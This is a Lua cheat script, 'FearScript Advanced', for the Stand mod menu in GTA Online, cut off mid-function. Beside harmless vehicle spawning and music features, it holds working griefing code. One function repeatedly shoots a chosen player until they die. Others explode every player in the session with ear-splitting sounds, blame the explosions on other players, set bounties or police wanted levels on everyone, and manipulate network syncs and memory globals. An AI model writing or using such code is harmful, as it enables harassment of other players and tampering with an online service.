--[[

    FearScript Advanced for Stand by StealthyAD.
    The All-In-One Script combines every each script.

    INTRODUCION: 

    Features:
    - Compatible All Stand Versions.
    - Includes Standify & Cruise Missile Tool (GitHub)

]]--

    ----======================================----
    ---             Core Functions
    --- The most essential part of Lua Script.
    ----======================================----

    util.keep_running()
    util.require_natives(1676318796)
    util.require_natives(1663599433)

    local FearRoot = menu.my_root()
    local FearVersion = "0.23.6"
    local FearScriptNotif = "> FearScript Advanced "..FearVersion
    local FearScript = "FearScript Advanced"
    local FearScriptV1 = "FearScript Advanced "..FearVersion
    local FearSEdition = 100.4
    local FearToast = util.toast

    local aalib = require("aalib")
    local FearStandify_ver = "0.20.5"
    local FearScriptStandify = "> FearScript Standify "..FearStandify_ver
    local FearPlaySound = aalib.play_sound
    local SND_ASYNC<const> = 0x0001
    local SND_FILENAME<const> = 0x00020000

    ----=======================================----
    --- File Directory 'Standify Ported'
    --- Locate songs.wav and stop music easily.
    ----=======================================----
    
        local script_store_dir = filesystem.store_dir() .. SCRIPT_NAME .. '\\songs' -- Redirects to %appdata%\Stand\Lua Scripts\store\FearScriptAD\songs
        if not filesystem.is_dir(script_store_dir) then
            filesystem.mkdirs(script_store_dir)
        end
    
        local script_store_dir_stop = filesystem.store_dir() .. SCRIPT_NAME .. '/stop_sounds' -- Redirects to %appdata%\Stand\Lua Scripts\store\FearScriptAD\stop_sounds
        if not filesystem.is_dir(script_store_dir_stop) then
            filesystem.mkdirs(script_store_dir_stop)
        end

    ------=============================------
    ---   FearScript Basic Functions
    ------=============================------

    local FearSession = function() return util.is_session_started() and not util.is_session_transition_active() end

    local function request_ptfx_asset(asset)
        STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
            util.yield()
        end
    end

    local function get_player_count()
        return #players.list(true, true, true)
    end

    local function update_player_count()
        menu.set_menu_name(player_count, get_player_count() .. " player in the session.")
    end

    local function ends_with(str, ending)
        return ending == "" or str:sub(-#ending) == ending
    end

    local FearStandifyFiles = {}
        function UpdateAutoMusics()
            Music_TempFiles = {}
            for i, path in ipairs(filesystem.list_files(script_store_dir)) do
                local file_str = path:gsub(script_store_dir, ''):gsub("\\","")
                if ends_with(file_str, '.wav') then
                    Music_TempFiles[#Music_TempFiles+1] = file_str
                end
            end
            FearStandifyFiles = Music_TempFiles
        end
        UpdateAutoMusics()

    local function join_path(parent, child)
        local sub = parent:sub(-1)
        if sub == "/" or sub == "\\" then
            return parent .. child
        else
            return parent .. "/" .. child
        end
    end

    local current_sound_handle = nil
    local random_enabled = false

    local function AutoPlay(sound_location)
        if current_sound_handle then
            aalib.stop_sound(current_sound_handle)
            current_sound_handle = nil
        end
    
        current_sound_handle = aalib.play_sound(sound_location, SND_FILENAME | SND_ASYNC, function()
            if random_enabled then
                AutoPlay(sound_location)
            end
        end)
    end

    local function FearStandifyLoading(directory)
        local FearStandifyLoadedSongs = {}
        for _, filepath in ipairs(filesystem.list_files(directory)) do
            local _, filename, ext = string.match(filepath, "(.-)([^\\/]-%.?([^%.\\/]*))$")
            if not filesystem.is_dir(filepath) and ext == "wav" then
                local name = string.gsub(filename, "%.wav$", "")
                local sound_location = join_path(directory, filename)
                FearStandifyLoadedSongs[#FearStandifyLoadedSongs + 1] = {file=name, sound=sound_location}
            end
        end
        return FearStandifyLoadedSongs
    end

    function GetFileNameFromPath(path) -- Redirect to the filename
        if path and path ~= "" then -- check if path is not nil or empty
            return path:match("^.+/(.+)$")
        end
        return nil
    end

    function SET_INT_GLOBAL(Global, Value)
        memory.write_int(memory.script_global(Global), Value)
    end
    
    function GET_INT_LOCAL(script, script_local)
        if memory.script_local(script, script_local) ~= 0 then
            local ReadLocal = memory.read_int(memory.script_local(script, script_local))
            if ReadLocal ~= nil then
                return ReadLocal
            end
        end
    end
    
    function EXECUTION_FUNCTION_WORKING(IsAddNewLine)
        local State = ""
        local Version = tonumber(NETWORK.GET_ONLINE_VERSION())
        if util.is_session_started() then
            if GET_INT_LOCAL("freemode", 3618) ~= util.joaat("lr_prop_carkey_fob") then 
            end
        end
        return State
    end

    local function load_weapon_asset(hash)
        while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
            WEAPON.REQUEST_WEAPON_ASSET(hash)
            util.yield(50)
        end
    end

    local function FearPassiveShot(pid)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local hash = 0x787F0BB
    
        local audible = true
        local visible = true
    
        load_weapon_asset(hash)
        
        for i = 0, 50 do
            if PLAYER.IS_PLAYER_DEAD(pid) then
                util.toast("Successfully killed " .. players.get_name(pid))
                return
            end
    
            local coords = ENTITY.GET_ENTITY_COORDS(ped)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z - 2, 100, 0, hash, 0, audible, not visible, 2500)
            
            util.yield(10)
        end
    
        util.toast(FearScriptNotif.."\nWe are not able to kill " .. players.get_name(pid) .. ". Verify if the player is not in ragdoll mode or godmode.")
    end

    local function request_control_of_entity(ent, time)
        if ent and ent ~= 0 then
            local end_time = os.clock() + (time or 3)
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and os.clock() < end_time do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                util.yield()
            end
            return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
        end
        return false
    end
    
    local function load_model(hash)
        local request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end
    
    ------=============================------
    ---   FearScript Advanced Functions
    ------=============================------

    local FearScriptLand = 5
    Fear = {
        int = function(global, value)
            local radress = memory.script_global(global)
            memory.write_int(radress, value)
        end,

        request_model_load = function(hash)
            request_time = os.time()
            if not STREAMING.IS_MODEL_VALID(hash) then
                return
            end
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                if os.time() - request_time >= 10 then
                    break
                end
                util.yield()
            end
        end,

        cwash_in_progwess = function()
            kitty_alpha = 0
            kitty_alpha_incr = 0.01
            kitty_alpha_thread = util.create_thread(function (thr)
                while true do
                    kitty_alpha = kitty_alpha + kitty_alpha_incr
                    if kitty_alpha > 1 then
                        kitty_alpha = 1
                    elseif kitty_alpha < 0 then 
                        kitty_alpha = 0
                        util.stop_thread()
                    end
                    util.yield(5)
                end
            end)

            kitty_thread = util.create_thread(function (thr)
                starttime = os.clock()
                local alpha = 0
                while true do
                    timepassed = os.clock() - starttime
                    if timepassed > 3 then
                        kitty_alpha_incr = -0.01
                    end
                    if kitty_alpha == 0 then
                        util.stop_thread()
                    end
                    util.yield(5)
                end
            end)
        end,

        KJFNkjfjkFKJ = function(player_id)
            players.get_rockstar_id(player_id)
        end,

        get_spawn_state = function(player_id)
            return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
        end,

        get_interior_of_player = function(player_id)
            return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
        end,

        is_player_in_interior = function(player_id)
            return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
        end,

        get_random_pos_on_radius = function()
            local angle = random_float(0, 2 * math.pi)
            pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
            return pos
        end,

        get_transition_state = function(player_id)
            return memory.read_int(memory.script_global(((0x2908D3 + 1) + (player_id * 0x1C5)) + 230))
        end,

        get_interior_player_is_in = function(player_id)
            return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
        end,

        ChangeNetObjOwner = function(object, player)
            if NETWORK.NETWORK_IS_IN_SESSION() then
                local net_object_mgr = memory.read_long(CNetworkObjectMgr)
                if net_object_mgr == NULL then
                    return false
                end
                if not ENTITY.DOES_ENTITY_EXIST(object) then
                    return false
                end
                local netObj = get_net_obj(object)
                if netObj == NULL then
                    return false
                end
                local net_game_player = GetNetGamePlayer(player)
                if net_game_player == NULL then
                    return false
                end
                util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
                return true
            else
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
                return true
            end
        end,

        anim_request = function(hash)
            STREAMING.REQUEST_ANIM_DICT(hash)
            while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
                util.yield()
            end
        end,

        disableProjectileLoop = function(projectile)
            util.create_thread(function()
                util.create_tick_handler(function()
                    WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
                    return remove_projectiles
                end)
            end)
        end,

        yieldModelLoad = function(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
        end,

        get_control_request = function(ent)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                local tick = 0
                while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                    tick = tick + 1
                    util.yield()
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            end
            return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
        end,

        rotation_to_direction = function(rotation)
            local adjusted_rotation = 
            { 
                x = (math.pi / 180) * rotation.x, 
                y = (math.pi / 180) * rotation.y, 
                z = (math.pi / 180) * rotation.z 
            }
            local direction = 
            {
                x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
                y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
                z =  math.sin(adjusted_rotation.x)
            }
            return direction
        end,

        request_model = function(hash, timeout)
            timeout = timeout or 3
            STREAMING.REQUEST_MODEL(hash)
            local end_time = os.time() + timeout
            repeat
                util.yield()
            until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
            return STREAMING.HAS_MODEL_LOADED(hash)
        end,

        BlockSyncs = function(player_id, callback)
            for _, i in ipairs(players.list(false, true, true)) do
                if i ~= player_id then
                    local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                    menu.trigger_command(outSync, "on")
                end
            end
            util.yield(10)
            callback()
            for _, i in ipairs(players.list(false, true, true)) do
                if i ~= player_id then
                    local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                    menu.trigger_command(outSync, "off")
                end
            end
        end,

        disable_traffic = true,
        disable_peds = true,
        pwayer = players.user_ped(),

        maxTimeBetweenPress = 300,
        pressedT = util.current_time_millis(),
        Int_PTR = memory.alloc_int(),
        mpChar = util.joaat("mpply_last_mp_char"),

        getMPX = function()
            STATS.STAT_GET_INT(Fear.mpChar, Fear.Int_PTR, -1)
            return memory.read_int(Fear.Int_PTR) == 0 and "MP0_" or "MP1_"
        end,

        STAT_GET_INT = function(Stat)
            STATS.STAT_GET_INT(util.joaat(Fear.getMPX() .. Stat), Fear.Int_PTR, -1)
            return memory.read_int(Fear.Int_PTR)
        end,

        getNightclubDailyEarnings = function()
            local popularity = math.floor(Fear.STAT_GET_INT("CLUB_POPULARITY") / 10)
            if popularity > 90 then return 10000
            elseif popularity > 85 then return 9000
            elseif popularity > 80 then return 8000
            elseif popularity > 75 then return 7000
            elseif popularity > 70 then return 6000
            elseif popularity > 65 then return 5500
            elseif popularity > 60 then return 5000
            elseif popularity > 55 then return 4500
            elseif popularity > 50 then return 4000
            elseif popularity > 45 then return 3500
            elseif popularity > 40 then return 3000
            elseif popularity > 35 then return 2500
            elseif popularity > 30 then return 2000
            elseif popularity > 25 then return 1500
            elseif popularity > 20 then return 1000
            elseif popularity > 15 then return 750
            elseif popularity > 10 then return 500
            elseif popularity > 5 then return 250
            else return 100
            end
        end,

        playerIsTargetingEntity = function(playerPed)
            local playerList = players.list(true, true, true)
            for k, playerPid in pairs(playerList) do
                if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY  (playerPid, playerPed) then 
                    if not isWhitelisted(playerPid) then
                        karma[playerPed] = {
                            pid = playerPid, 
                            ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                        }
                        return true 
                    end
                end
            end
            karma[playerPed] = nil
            return false 
        end,

        explodePlayer = function(ped, loop)
            local pos = ENTITY.GET_ENTITY_COORDS(ped)
            local blamedPlayer = PLAYER.PLAYER_PED_ID() 
            if blameExpPlayer and blameExp then 
                blamedPlayer = PLAYER.GET_PLAYER_PED(blameExpPlayer)
            elseif blameExp then
                local playerList = players.list(true, true, true)
                blamedPlayer = PLAYER.GET_PLAYER_PED(math.random(0, #playerList))
            end
            if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                for i = 0, 50, 1 do --50 explosions to account for armored vehicles
                    if ownExp or blameExp then 
                        owned_explosion(blamedPlayer, pos)
                    else
                        explosion(pos)
                    end
                    util.yield(10)
                end
            elseif ownExp or blameExp then
                owned_explosion(blamedPlayer, pos)
            else
                explosion(pos)
            end
            util.yield(10)
        end,

        get_coords = function(entity)
            entity = entity or PLAYER.PLAYER_PED_ID()
            return ENTITY.GET_ENTITY_COORDS(entity, true)
        end,

        play_all = function(sound, sound_group, wait_for)
            for i=0, 31, 1 do
                AUDIO.PLAY_SOUND_FROM_ENTITY(-1, sound, PLAYER.GET_PLAYER_PED(i), sound_group, true, 20)
            end
            util.yield(wait_for)
        end,

        explode_all = function(earrape_type, wait_for)
            for i=0, 31, 1 do
                coords = Fear.get_coords(PLAYER.GET_PLAYER_PED(i))
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 100, true, false, 150, false)
                if earrape_type == EARRAPE_BED then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                end
                if earrape_type == EARRAPE_FLASH then
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                end
            end
            util.yield(wait_for)
        end,
    }

        ----=============================================----
        ---                Updates Features
        --- Update manually/automatically the Lua Scripts
        ---     Import from Hexarobi Auto-Updater.
        ----=============================================----
    
        local default_check_interval = 604800
        local auto_update_config = {
            source_url="https://raw.githubusercontent.com/StealthyAD/FearScript-Advanced/main/FearScriptAD.lua",
            script_relpath=SCRIPT_RELPATH,
            switch_to_branch=selected_branch,
            verify_file_begins_with="--",
            check_interval=86400,
            silent_updates=true,
        }
    
        -- Auto Updater from https://github.com/hexarobi/stand-lua-auto-updater
        local status, auto_updater = pcall(require, "auto-updater")
        if not status then
            local auto_update_complete = nil FearToast("Installing auto-updater...", TOAST_ALL)
            async_http.init("raw.githubusercontent.com", "/hexarobi/stand-lua-auto-updater/main/auto-updater.lua",
                function(result, headers, status_code)
                    local function parse_auto_update_result(result, headers, status_code)
                        local error_prefix = "Error downloading auto-updater: "
                        if status_code ~= 200 then FearToast(error_prefix..status_code, TOAST_ALL) return false end
                        if not result or result == "" then FearToast(error_prefix.."Found empty file.", TOAST_ALL) return false end
                        filesystem.mkdir(filesystem.scripts_dir() .. "lib")
                        local file = io.open(filesystem.scripts_dir() .. "lib\\auto-updater.lua", "wb")
                        if file == nil then FearToast(error_prefix.."Could not open file for writing.", TOAST_ALL) return false end
                        file:write(result) file:close() FearToast("Successfully installed auto-updater lib", TOAST_ALL) return true
                    end
                    auto_update_complete = parse_auto_update_result(result, headers, status_code)
                end, function() FearToast("Error downloading auto-updater lib. Update failed to download.", TOAST_ALL) end)
            async_http.dispatch() local i = 1 while (auto_update_complete == nil and i < 40) do util.yield(250) i = i + 1 end
            if auto_update_complete == nil then error("Error downloading auto-updater lib. HTTP Request timeout") end
            auto_updater = require("auto-updater")
        end
        if auto_updater == true then error("Invalid auto-updater lib. Please delete your Stand/Lua Scripts/lib/auto-updater.lua and try again") end
        
        -- Run Auto Update
        auto_updater.run_auto_update({
            source_url="https://raw.githubusercontent.com/StealthyAD/FearScript-Advanced/main/FearScriptAD.lua",
            script_relpath=SCRIPT_RELPATH,
            verify_file_begins_with="--"
        })

    ------===============------
    ---   Quick Variables
    ------===============------

        local FearCommand = menu.trigger_command
        local FearCommands = menu.trigger_commands
        local FearPath = menu.ref_by_path
        local FearHelp = util.show_corner_help
        local FearTime = util.yield

    ------==============------
    ---   Main Functions
    ------==============------

        FearRoot:divider(FearScriptV1)
        FearRoot:divider("Main Menu Features")

        FearRoot:action("Players Options", {}, "", function()
            local PlayerList = menu.ref_by_path("Players")
		    menu.trigger_command(PlayerList, "")
        end)
        local FearSelf = FearRoot:list("Self Features")
        local FearVehicles = FearRoot:list("Vehicles Features")
        local FearOnline = FearRoot:list("Online Features")
        local FearStandify = FearRoot:list("Standify", {""}, "Standify, script related to music.\nMade by StealthyAD.")
        local FearCruiseMissile = FearRoot:list("Cruise Missile", {""}, "CruiseMissile, script related to Cruise Missile Range.\nMade by StealthyAD.")
        local FearMiscs = FearRoot:list("Miscellaneous")

        ------==============------
        ---   Self Functions
        ------==============------  

            FearSelf:divider("FearScript Self")
            FearSelf:action("Fall on the ground", {'fearragdoll'}, "Just fall yourself on the ground.", function()
                PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2500, 0, 0, false, false, false) 
                FearTime(150)
                FearToast(FearScriptNotif.."\nLol, why are you falling on the ground?")
                FearTime(100)
            end)

        ------==================------
        ---   Vehicles Functions
        ------==================------  

            local Fconfig = {
                disable_traffic = true,
                disable_peds = true,
            }

            local pop_multiplier_id

            FearVehicles:divider("FearScript Vehicles")
            FearVehicles:divider("Summon Tweaks")

            FearVehicles:action("Commercial Planes", {"fearcomplane"}, "Summon plane and flight peacefully.\nNOTE: Some vehicles are randomly spawned.", function()
                local vehicles = {"Boeing 747", "Antonov AN-225", "Nimbus", "Private Jet", "Golden Jet", "Miljet"}
                local index = math.random(#vehicles)
                local vehicle = vehicles[index]
                table.remove(vehicles, index)
                FearCommands("spawntune full")
                if vehicle == "Boeing 747" then
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("jet")
                   FearTime(250)
                elseif vehicle == "Antonov AN-225" then
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("cargoplane")
                   FearTime(250)
                elseif vehicle == "Nimbus" then
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("nimbus")
                    FearTime(250)
                elseif vehicle == "Private Jet" then
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("luxor")
                    FearTime(250)
                elseif vehicle == "Golden Jet" then
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("luxor2")
                    FearTime(250)
                elseif vehicle == "Miljet" then
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("miljet")
                    FearTime(250)
                end
                FearToast(FearScriptNotif.."\nEnjoy your commercial plane at cruise altitude with your "..vehicle.." !")
            end)

            FearVehicles:action("Dogfight Planes", {"feardogfight"}, "Summon plane and Fight.\nNOTE: Some vehicles are randomly spawned.", function()
                local vehicles = {"P-996 Lazer", "Mammoth Hydra", "B-11 Strikeforce", "LF-22 Starling", "V-65 Molotok", "P-45 Nokota", "Pyro", "Western Rogue", "Seabreeze"}
                local index = math.random(#vehicles)
                local vehicle = vehicles[index]
                table.remove(vehicles, index)
                FearCommands("spawntune full")
                if vehicle == "P-996 Lazer" then -- Spawning Lazer
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("lazer")
                   FearTime(250)
                elseif vehicle == "Mammoth Hydra" then -- Spawning Hydra
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("hydra")
                   FearTime(250)
                elseif vehicle == "B-11 Strikeforce" then -- Spawning B-11 Strikeforce Fully
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("strikeforce")
                   FearTime(250)
                elseif vehicle == "LF-21 Starling" then -- Spawning LF-22 Starling Fully
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("starling")
                   FearTime(250)
                elseif vehicle == "V-65 Molotok" then -- Spawning V-65 Molotok Fully
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("molotok")
                    FearTime(250)
                elseif vehicle == "P-45 Nokota" then -- Spawning P-45 Nokota Fully
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("nokota")
                    FearTime(250)
                elseif vehicle == "Western Rogue" then -- Spawning Western Rogue Fully
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("rogue")
                    FearTime(250)
                elseif vehicle == "Seabreeze" then -- Spawning Seabreeze Fully
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("seabreeze") 
                    FearTime(250)
                end
                FearToast(FearScriptNotif.."\nEnjoy your dogfight at cruise altitude with your "..vehicle.." !")
            end)

            FearVehicles:action("Oppressor Party", {"fearopr"}, "Summon Oppressor.\nNOTE: Some vehicles are randomly spawned.", function()
                local vehicles = {"Oppressor", "Oppressor Mk II"}
                local index = math.random(#vehicles)
                local vehicle = vehicles[index]
                table.remove(vehicles, index)
                FearCommands("spawntune full")
                if vehicle == "Oppressor" then
                   FearCommands("oppressor")
                   FearTime(250)
                elseif vehicle == "Oppressor Mk II" then
                   FearCommands("oppressor2")
                   FearTime(250)
                end
                FearToast(FearScriptNotif.."\nEnjoy your "..vehicle.." !")
            end)

            FearVehicles:action("Strategic Bomber Planes", {"fearstratbomb"}, "Summon Strategic Bomber Planes and flight harder.\nNOTE: Some vehicles are randomly spawned.", function()
                local vehicles = {"B-1B Lancer", "Avro Vulcan", "AC-130"}
                local index = math.random(#vehicles)
                local vehicle = vehicles[index]
                table.remove(vehicles, index)
                FearCommands("spawntune full")
                if vehicle == "B-1B Lancer" then
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("alkonost")
                   FearTime(250)
                elseif vehicle == "Avro Vulcan" then
                   FearCommands("tphigh")
                   FearTime(500)
                   FearCommands("volatol")
                   FearTime(250)
                elseif vehicle == "AC-130" then
                    FearCommands("tphigh")
                    FearTime(500)
                    FearCommands("bombushka")
                    FearTime(250)
                end
                FearToast(FearScriptNotif.."\nEnjoy your Strategic Bomber at cruise altitude with your "..vehicle.." !")
            end)
             
            FearVehicles:action("Summon Tank", {"feartank"}, "Summon Leopard 2A (Rhino Tank) / PL-01 Concept (TM-02 Khanjali) or BRDM-2 (APC).\nNOTE: Some vehicles are randomly spawned.", function()
                local vehicles = {"Leopard 2A", "PL-01 Concept", "BRDM-2"}
                local index = math.random(#vehicles)
                local vehicle = vehicles[index]
                table.remove(vehicles, index)
                FearCommands("spawntune full")
                if vehicle == "Leopard 2A" then
                   FearCommands("rhino")
                   FearTime(250)
                elseif vehicle == "PL-01 Concept" then
                   FearCommands("khanjali")
                   FearTime(250)
                elseif vehicle == "BRDM-2" then
                    FearCommands("apc")
                    FearTime(250)
                end
                FearToast(FearScriptNotif.."\nEnjoy your "..vehicle.." !")
            end)

            FearVehicles:divider("Vehicle Tweaks")
            FearVehicles:toggle_loop("Toggle Engine", {'fearturnengine'}, "Cut off/On your Engine", function()
                FearCommands("turnengineoff")
            end)

            FearVehicles:toggle("Toggle No Traffic", {'ftoggletraffic'}, "Toggle On/Off Traffic if NPC are driving.\nNOTE: It will affects nearby players who drive.\nChanging the session will revert back Normal Traffic NPC.", function(on)
                if on then
                    local ped_sphere, traffic_sphere
                    if Fconfig.disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
                    if Fconfig.disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
                    pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 15000.0, ped_sphere, traffic_sphere, false, true)
                    MISC.CLEAR_AREA(1.1, 1.1, 1.1, 19999.9, true, false, false, true)
                else
                    MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
                end
            end)

        ------================------
        ---   Online Functions
        ------================------

            FearOnline:divider("FearScript Online")
            local FearToggleSelf = true

            ------================------
            ---   Session Features
            ------================------

            local FearSessionL = FearOnline:list("Session")
            FearSessionL:divider("FearSession Advanced")
            player_count = FearSessionL:divider(get_player_count())

                FearSessionL:action("Find Public Session (Max)", {"fearmaxplayer"}, "Go to Public Session", function()
                    FearCommands("go public")
                    FearCommands("playermagnet 28")
                    FearToast(FearScriptNotif.."\nEnjoy to find the session fully.")
                    FearTime()
                end)

                FearSessionL:action("Find Public Session (Less)", {"fearlessplayer"}, "Go to Public Session", function()
                    FearCommands("go public")
                    FearCommands("playermagnet 5")
                    FearToast(FearScriptNotif.."\nEnjoy to find the session less.")
                    FearTime()
                end)

                FearSessionL:divider("Main Tweaks")
                FearSessionL:toggle_loop("Exclude Self", {"fexcludeself"}, "Exclude Self for using these features.\nNOTE: It will includes Main Tweaks and Game Tweaks.", function()
                    FearToggleSelf = on == false
                end)
                local FearBountySess = FearSessionL:list("Bounty Features")
                local FearWantedSess = FearSessionL:list("Wanted Features")

            ----=====================================================----
            ---                 Bounty Features
            ---     All of the functions, Bounty Functions
            ----=====================================================----

                    local FearBountySess_value = 0
                    FearBountySess:divider("FearBounty Advanced")
                    FearBountySess:slider("Bounty Value",{"fearbounty"}, "Chose the amount of the bounty offered automatically.", 0, 10000, 0 , 1, function(value)
                        FearBountySess_value = value
                    end)
                    
                    FearBountySess:toggle("Auto Bounty", {"fearautob"}, "Put everyone automatically Bounty to all players." ,function()
                        for _,pid in pairs(players.list(FearToggleSelf)) do
                            if FearSession() and players.get_bounty(pid) ~= FearBountySess_value and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("bounty"..players.get_name(pid).." "..FearBountySess_value)
                            end
                        end
                        util.yield(1000)
                    end)


                    FearBountySess:action("Manual Bounty", {"fearmanualb"}, "Put everyone manually Bounty to all players." ,function()
                        for _,pid in pairs(players.list(FearToggleSelf)) do
                            if FearSession() and players.get_bounty(pid) ~= FearBountySess_value and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("bounty"..players.get_name(pid).." "..FearBountySess_value)
                            end
                        end
                        util.yield(1000)
                    end, nil, nil, COMMANDPERM_RUDE)

            ----=====================================================----
            ---                 Wanted Features
            ---     All of the functions, Bounty Functions
            ----=====================================================----

                    local FearWantedSess_value = 0
                    FearWantedSess:divider("FearWanted Advanced")
                    FearWantedSess:slider("Wanted Value", {"fearwanteds"}, "Chose the amount of the wanted offered automatically/manually to cops.", 0, 5, 0 , 1, function(value)
                        FearWantedSess_value = value
                    end)
                    
                    FearWantedSess:toggle("Auto Wanted", {"fearautowt"}, "Put everyone automatically Cops to all players." ,function()
                        for _,pid in pairs(players.list(FearToggleSelf)) do
                            if FearSession() and players.set_wanted_level(pid, FearWantedSess_value) ~= FearWantedSess_value and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("pwanted"..players.get_name(pid).." "..FearWantedSess_value)
                            end
                        end
                        FearTime(1000)
                    end)

                    FearWantedSess:action("Manual Wanted", {"fearmanualw"}, "Put everyone manually Cops to all players." ,function()
                        for _,pid in pairs(players.list(FearToggleSelf)) do
                            if FearSession() and players.set_wanted_level(pid, FearWantedSess_value) ~= FearWantedSess_value and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("pwanted"..players.get_name(pid).." "..FearWantedSess_value)
                            end
                        end
                        FearTime(1000)
                    end, nil, nil, COMMANDPERM_RUDE)

                    FearWantedSess:action("Never Wanted", {"fearneverw"}, "Put everyone manually No Cops to all players." ,function()
                        for _,pid in pairs(players.list(FearToggleSelf)) do
                            if FearSession() and players.set_wanted_level(pid, FearWantedSess_value) ~= FearWantedSess_value and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("pwanted"..players.get_name(pid).." 0")
                            end
                        end
                        FearTime(1000)
                    end, nil, nil, COMMANDPERM_FRIENDLY)

            ----=====================================================----
            ---                 Vehicle Tweaks
            ---     All of the functions, spawning cars, etc...
            ----=====================================================----

                FearSessionL:divider("Vehicle Tweaks")
                FearSessionL:action("Spawn Vehicle", {"fearspawnvehall"}, "Spawn everyone a vehicle", function (click_type)
                    menu.show_command_box_click_based(click_type, "fearspawnvehall ")
                end,
                function (txt)
                    local hash = util.joaat(txt)
                    
                    if not STREAMING.HAS_MODEL_LOADED(hash) then
                        load_model(hash)
                    end
                    
                    for k,v in pairs(players.list(true, true, true)) do
                        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
                        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                    
                        local vehicle = entities.create_vehicle(hash, c, 0)
                    
                        request_control_of_entity(vehicle)
                        FearToast(FearScriptNotif.."\nAlright, you have spawned everyone.")
                        FearTime()
                    end
                end)

                FearSessionL:action("Oppresor Land", {"fearoppressorland"}, "Spawn everyone OppressorLand", function ()
                    local function upgrade_vehicle(vehicle)
                        for i = 0, 49 do
                            local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                            VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                        end
                    end
                    local function give_oppressor(pid)
